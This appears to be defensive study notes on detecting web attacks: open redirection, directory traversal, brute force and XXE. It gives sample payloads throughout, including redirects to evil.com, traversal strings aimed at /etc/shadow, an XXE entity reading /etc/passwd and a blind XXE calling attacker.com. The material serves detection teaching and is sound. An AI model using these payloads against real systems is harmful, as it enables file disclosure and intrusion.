# Detecting Web Attacks 2

## Table of Contents
- [Open Redirection Attacks](#open-redirection-attacks)
- [Directory Traversal Attacks](#directory-traversal-attacks)
- [Brute Force Attacks](#brute-force-attacks)
- [XML External Entity (XXE) Attacks](#xml-external-entity-xxe-attacks)

---

# Open Redirection Attacks

## What is Open Redirection?

Open Redirection occurs when a web application redirects users to a URL supplied by the user **without proper validation**. Attackers can 
abuse this behavior to redirect victims from a trusted website to a malicious one.

### Impact
- Phishing attacks
- Malware distribution
- Credential theft
- Social engineering attacks
- Reputational damage

---

## How Open Redirection Works

A vulnerable application may use a URL parameter directly:

```text
https://example.com/redirect?url=http://malicious-site.com
```

When a user clicks the link, the application redirects them to the attacker-controlled website.

---

## Common Attack Vectors

- URL-based redirects (`?url=`)
- Parameter-based redirects (`?next=`, `?redirect=`)
- JavaScript redirects
- Meta Refresh redirects
- HTTP Location header redirects

---

## Prevention

- Validate and sanitize redirect URLs.
- Use allowlists (whitelists) for approved domains.
- Avoid using user-controlled input in redirects.
- Implement proper authentication and authorization.
- Conduct regular security testing.

---

## Detecting Open Redirection Attacks

### Indicators

Look for:

- Parameters such as:
  - `url=`
  - `next=`
  - `redirect=`
- External domains in parameters.
- URL-encoded destinations.
- Multiple redirect attempts from the same source.

### Example Payloads

```text
?url=http://attacker.com
?next=https://evil.com
?redirect=https%3A%2F%2Fevil.com
```

### Common Bypass Techniques

Attackers may use:

```text
http://127.0.0.1
http://2130706433
http://0x7f000001
http://[::]:25/
http://①②⑦.⓪.⓪.⓪
```

### Detection Clues

- Repeated requests containing external URLs.
- URL-encoded values.
- Same source IP making multiple redirect attempts.
- Requests occurring within seconds of each other.

---

# Directory Traversal Attacks

## What is Directory Traversal?

Directory Traversal is an attack that allows attackers to access files and directories outside the intended web root by manipulating file paths.

Also known as:

- Path Traversal
- Dot-Dot-Slash Attack

### Example

```text
http://example.com/file.php?name=../../etc/passwd
```

---

## Impact

Successful exploitation may lead to:

- Disclosure of sensitive files
- Access to configuration files
- Credential theft
- Arbitrary code execution
- Privilege escalation
- System compromise

---

## Common Attack Vectors

- URL parameters
- Cookies
- HTTP headers
- File upload functionality
- Direct URL manipulation
- Malicious links

---

## Prevention

- Validate and sanitize all user input.
- Use relative paths where possible.
- Restrict file system permissions.
- Implement allowlists.
- Avoid direct file path concatenation.
- Deploy a Web Application Firewall (WAF).

---

## Detecting Directory Traversal Attacks

### Common Payloads

```text
../
../../
../../../
```

Encoded:

```text
%2e%2e%2f
%252e%252e%252f
```

Unicode variants may also be used.

### Sensitive File Targets

#### Linux

```text
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
```

#### Windows

```text
c:\boot.ini
c:\inetpub\wwwroot\web.config
c:\inetpub\wwwroot\global.asa
c:\sysprep.inf
```

### Detection Indicators

Look for:

- `../`
- `%2e%2e%2f`
- Double-encoded traversal sequences
- Requests targeting sensitive files
- Repeated traversal attempts from the same source

---

# Brute Force Attacks

## What is Brute Forcing?

Brute forcing is an attack where attackers repeatedly attempt username/password combinations until valid credentials are found.

### Common Targets

- Login portals
- Admin panels
- Webmail systems
- VPN portals
- APIs

---

## Impact

- Account takeover
- Unauthorized access
- Data breaches
- Password reuse attacks
- Denial of Service (DoS)

---

## Common Attack Types

### Credential Brute Force

Attempts many username/password combinations.

### Password Spraying

Attempts one password against many users.

### Directory Brute Force

Attempts to discover hidden files and directories.

Example tools:

- Wfuzz
- Gobuster
- Dirb
- Burp Suite Intruder
- Hydra

---

## Prevention

- Account lockout policies
- CAPTCHA
- Rate limiting
- Multi-Factor Authentication (MFA)
- Strong password policies
- User activity monitoring
- WAF protection

---

## Detecting Brute Force Attacks

### Indicators

Look for:

- Numerous failed login attempts
- Multiple requests from a single IP
- Rapid login attempts
- Requests to login pages within short periods
- Multiple usernames from one source

### Log Analysis Clues

Failed authentication:

```text
401 Unauthorized
403 Forbidden
```

Potential successful login:

```text
200 OK
302 Redirect
```

### What to Investigate

- Source IP
- User-Agent
- Number of failed attempts
- Time interval between requests
- Successful logins after failures

### Response Actions

- Block source IP
- Enable Fail2Ban
- Lock affected accounts
- Investigate account compromise

---

# XML External Entity (XXE) Attacks

## What is XXE?

XML External Entity (XXE) is a vulnerability that occurs when an application processes XML input and allows external entities to be resolved.

Attackers can abuse XXE to:

- Read local files
- Perform SSRF
- Cause Denial of Service
- Potentially achieve Remote Code Execution

---

## How XXE Works

An attacker injects malicious XML containing external entity references.

Example:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

If external entities are enabled, the contents of `/etc/passwd` may be returned.

---

## Impact

### Information Disclosure

Reading sensitive files:

```text
/etc/passwd
/etc/shadow
web.config
```

### Server-Side Request Forgery (SSRF)

Accessing internal resources through the vulnerable server.

### Denial of Service

Resource exhaustion attacks.

### Remote Code Execution

Possible in specific vulnerable environments.

---

## Prevention

- Disable external entities.
- Validate and sanitize XML input.
- Use secure XML parsers.
- Implement allowlists.
- Restrict access to sensitive resources.
- Follow secure coding practices.

---

## Detecting XXE Attacks

### Common XXE Indicators

Look for:

```text
DOCTYPE
ENTITY
ELEMENT
```

### Example Payload

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Blind XXE

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
```

### Encoded Indicators

```text
%21DOCTYPE
```

Decodes to:

```text
!DOCTYPE
```

### Detection Clues

- XML content in requests.
- Presence of `DOCTYPE`, `ENTITY`, or `ELEMENT`.
- References to:
  - `file://`
  - `http://`
  - `https://`
- Repeated XML requests from the same source.
- Successful responses (`200`) after XXE payloads.

### Investigation Focus

- Source IP address
- XML parameters
- Requested files
- Outbound connections
- Response codes and sizes
- Repeated XXE attempts

---